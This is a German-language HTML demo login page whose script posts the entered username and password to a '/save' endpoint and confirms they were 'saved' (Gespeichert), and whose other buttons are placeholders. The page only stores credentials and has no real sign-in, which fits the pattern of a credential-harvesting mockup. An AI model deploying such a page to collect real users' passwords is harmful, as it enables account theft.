<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<title>Login Demo</title>

<style>
body {
  margin: 0;
  font-family: Arial;
  background: #12141c;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  color: white;
}

.box {
  width: 360px;
  border: 1px solid #3a3d45;
  padding: 25px;
  background: #1c1f26;
}

h2 {
  margin-bottom: 20px;
}

input {
  width: 100%;
  padding: 14px;
  margin-bottom: 10px;
  border: 1px solid #3a3d45;
  background: #2a2d35;
  color: white;
}

button {
  width: 100%;
  padding: 14px;
  margin-top: 10px;
  border: 1px solid #3a3d45;
  background: transparent;
  color: white;
  cursor: pointer;
}

button:hover {
  background: #2a2d35;
}

.link {
  text-align: center;
  margin-top: 15px;
  cursor: pointer;
}

.divider {
  height: 1px;
  background: #3a3d45;
  margin: 20px 0;
}

.secondary {
  background: #2a2d35;
  border: none;
}
</style>
</head>

<body>

<div class="box">
  <h2>Anmelden (Demo)</h2>

  <input id="user" placeholder="Benutzername">
  <input id="pass" type="password" placeholder="Passwort">

  <button onclick="send()">Anmelden</button>

  <div class="link" onclick="info()">
    Passwort vergessen?
  </div>

  <div class="divider"></div>

  <button class="secondary" onclick="info()">
    Code per E-Mail senden
  </button>

  <button class="secondary" onclick="info()">
    Schnellanmeldung
  </button>

  <div class="link" onclick="info()">
    Registrieren
  </div>
</div>

<script>
async function send() {
  await fetch("/save", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      username: user.value,
      password: pass.value
    })
  });

  alert("Gespeichert (Demo)");
}

function info() {
  alert("Demo-Funktion (keine echte Weiterleitung)");
}
</script>

</body>
</html>
